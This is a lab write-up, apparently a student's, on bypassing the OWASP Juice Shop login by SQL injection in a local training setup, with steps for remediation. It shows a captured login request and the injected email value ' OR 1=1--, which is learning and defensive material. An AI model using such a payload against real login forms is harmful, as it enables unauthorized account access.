# Lab 4: SQL Injection Login Bypass (OWASP Juice Shop)

## 📌 Overview

This lab demonstrates a SQL Injection vulnerability that allows authentication bypass in a vulnerable web application (OWASP Juice Shop).

The objective was to intercept a login request and manipulate it to gain access without valid credentials.

---

## 🛠 Tools Used

* Kali Linux
* Burp Suite (Proxy Interception)
* OWASP Juice Shop (Docker)

---

## 🎯 Objective

Gain unauthorized access to a user account by exploiting improper input validation in the login functionality.

---

## 🔍 Steps Performed

### 1. Intercept Login Request

* Opened Burp Suite and enabled proxy interception
* Configured browser to route traffic through Burp
* Navigated to the Juice Shop login page
* Entered test credentials and captured the request

Captured request:

```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"test@test.com","password":"test"}
```

---

### 2. Modify Request (SQL Injection)

The email parameter was modified to inject a SQL condition:

```json
{"email":"' OR 1=1--","password":"test"}
```

---

### 3. Forward the Request

* Sent the modified request to the server
* Disabled interception to allow processing

---

## ✅ Result

* Successfully logged into the application without valid credentials
* Authentication was bypassed due to improper input handling

---

## 💥 Impact

* Unauthorized access to user accounts
* Potential exposure of sensitive data
* Compromise of application integrity

---

## 🔐 Remediation

To prevent this vulnerability:

* Use parameterized queries (prepared statements)
* Implement proper input validation and sanitization
* Avoid dynamic SQL query construction
* Use ORM frameworks where possible

---

## 🧠 Key Takeaways

* Intercepting and modifying requests is critical in web security testing
* Even simple payloads can expose serious vulnerabilities
* Understanding backend logic is more important than tools

---

## 📎 Notes

This lab was performed in a controlled environment using an intentionally vulnerable application for learning purposes.
